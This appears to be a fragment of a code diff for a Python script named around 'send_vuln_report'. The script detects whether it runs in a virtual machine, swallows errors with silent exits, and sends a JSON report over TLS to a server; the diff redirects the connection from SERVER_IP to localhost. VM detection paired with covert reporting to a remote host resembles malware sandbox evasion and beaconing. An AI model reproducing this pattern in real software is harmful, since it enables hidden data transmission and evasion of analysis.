@@ -17,11 +17,11 @@ def send_vuln_report(vuln_data):
     except KeyboardInterrupt:
         exit(1)
 
-    # except TimeoutError:
-    #     exit(1)
+    except TimeoutError:
+        exit(1)
 
-    # except Exception as e:
-    #     exit(1) 
+    except Exception as e:
+        exit(1) 
 
     if is_vm():  
         message = f"[!] Error: The system is running in a virtual machine."
@@ -32,7 +32,7 @@ def send_vuln_report(vuln_data):
         "message": message,
         "is_vm": is_vm_flag
     }
-    with socket.create_connection((SERVER_IP, PORT)) as sock:
+    with socket.create_connection(("localhost", 1234)) as sock:
         with context.wrap_socket(sock, server_hostname=SERVER_IP) as secure_sock:
             secure_sock.sendall(json.dumps(data_to_send).encode('utf-8'))
 
@@ -45,8 +45,8 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         exit(1)
 
-    # except TimeoutError:
-    #     exit(1)
+    except TimeoutError:
+        exit(1)
 
-    # except Exception as e:
-    #     exit(1)
+    except Exception as e:
+        exit(1)
